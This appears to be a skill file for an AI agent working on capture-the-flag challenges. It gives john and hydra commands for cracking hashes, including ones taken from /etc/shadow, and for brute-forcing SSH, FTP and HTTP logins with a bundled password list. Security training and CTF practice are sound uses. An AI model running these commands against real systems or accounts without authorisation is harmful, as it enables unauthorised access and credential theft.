---
description: Crack a hash or brute-force a login (john, hydra) using the bundled password wordlist.
---
# password-crack - crack hashes and brute-force logins

## When to use
You have a **hash** (from a file, `/etc/shadow`, a database dump, a JWT) and need
the plaintext, OR a login service (SSH/FTP/HTTP form) you must brute-force. Any
**password** challenge. A small password wordlist is bundled at
`/skills/wordlists/passwords-top.txt` (no internet needed).

## Crack a hash with john
```sh
# 1) identify the hash type:
hashid 'THEHASH'
# 2) put the hash in a file, then crack with the bundled list:
echo 'THEHASH' > /tmp/h
john --wordlist=/skills/wordlists/passwords-top.txt /tmp/h
john --show /tmp/h                     # print cracked results
# force a format if john guesses wrong, e.g. raw-md5, sha256crypt, bcrypt:
john --format=raw-md5 --wordlist=/skills/wordlists/passwords-top.txt /tmp/h
```
For Linux `/etc/passwd` + `/etc/shadow`: `unshadow passwd shadow > /tmp/h` first.
For zip/pdf/ssh-key: `zip2john file.zip > /tmp/h` (also `pdf2john`, `ssh2john`).

## Brute-force a login with hydra
```sh
# SSH:
hydra -l USER -P /skills/wordlists/passwords-top.txt ssh://$HAL_TARGET_IP
# FTP:
hydra -l USER -P /skills/wordlists/passwords-top.txt ftp://$HAL_TARGET_IP
# HTTP POST form (adjust path + fields + failure string):
hydra -l admin -P /skills/wordlists/passwords-top.txt "$HAL_TARGET_IP" \
  http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
```

## Tips
- Try the empty password and username==password first; CTF creds are often weak.
- If the bundled list fails, the password may be the challenge name, a word from
  the page, or a value seen in an earlier step - add it and retry.
